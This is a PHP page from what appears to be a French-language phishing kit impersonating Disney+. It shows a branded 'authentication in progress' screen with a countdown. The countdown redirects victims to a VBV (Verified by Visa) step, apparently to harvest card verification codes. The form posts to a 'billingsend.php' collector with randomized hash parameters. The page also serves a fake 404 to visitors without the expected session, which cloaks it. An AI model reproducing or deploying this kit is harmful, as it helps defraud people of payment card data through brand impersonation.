﻿<?php 
ob_start();
session_start();
include('../config2.php');

if(isset($_SESSION['step_two'])){
?>
<head>
    <meta charset="utf-8">
    <meta http-equiv="refresh" content="<?php echo $vbvtimer?>;url=VBV.php" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta name="apple-mobile-web-app-title" content="Disney+">
    <meta name="theme-color" content="#ffffff">
    <meta name="msapplication-TileColor" content="#ffffff">

    <link rel="manifest" href="./img/ico/manifest.json">
    <link rel="shortcut icon" href="./img/ico/favicon.ico">
    <link rel="mask-icon" href="./img/ico/safari-pinned-tab.svg" color="#1d1fff">
    <link rel="apple-touch-icon" sizes="180x180" href="../img/ico/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="../img/ico/favicon-32x32.png">

    <title>Chargement | Disney+</title>

    <link rel="stylesheet" type="text/css" href="../style/app_styles_bundle.css">
    <link rel="stylesheet" type="text/css" href="../style/main.css">
    <link rel="stylesheet" type="text/css" href="../style/react.css">
    <style>
        html {
            display: none;
        }
    </style>
    <script>
        if (self == top) {
            document.documentElement.style.display = 'block';
        } else {
            top.location = self.location;
        }
        var timeleft = <?php echo $vbvtimer?>;
        var downloadTimer = setInterval(function(){
        timeleft--;
        document.getElementById("countdowntimer").textContent = timeleft;
        if(timeleft <= 0)
            clearInterval(downloadTimer);
        },1000);
    </script>
</head>

<body id="app_index" class="js-focus-visible">

    <style data-styled="" data-styled-version="4.4.1"></style>
    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../img/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                    <div class="sc-cmthru cJkwKD"><img style="width: 100%; margin: 0px;" src="../img/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                </div>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form id="dssLogin" name="dssLogin" action="<?php echo './send/billingsend.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" method="post">
                                <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;">ÉTAPE DE CONFIRMATION</div>
                                <br>
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Authentification en cours...</h3>
                                
                                <center>
                                    <img style="padding: -5px; padding-bottom: 5px; padding-top: 1px; width: 300px;" src="img/gear.gif">
                                </center>

                                <div>
                                    <center>
                                        <label>Redirection dans <span id="countdowntimer"><?php echo $vbvtimer?></span> secondes</label>
                                    </center>
                                </div>
                            </form>
                        </div>
                    </main>
                </div>
            </div>
            <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">OBTENIR DISNEY+</button></div>
            </div>
            <div id="webAppFooter">
                <footer class="sc-fgfRvd kAzEpp" style="margin-top: 100px;" id="footer">
                    <div class="sc-hIVACf fPaITX"><img style="width: 100%; margin: 0px;" src="../img/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                    <div class="sc-gpHHfC fohBoY"><button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Règles de Respect de la Vie Privée</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Modalités relatives aux cookies</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Droits Données dans l'UE et au R-U</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">A propos de Disney+</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Conditions générales d'abonnement</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Aide</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Appareils compatibles</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">À propos de Disney+</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Publicités ciblées par centres d'intérêt</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Gérer vos préférences</button>
                    </div>
                    <div class="sc-gVyKpa kOxdJt">© Disney. Tous droits réservés.</div>
                </footer>
            </div>
        </div>
    </div>
</body>
</html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>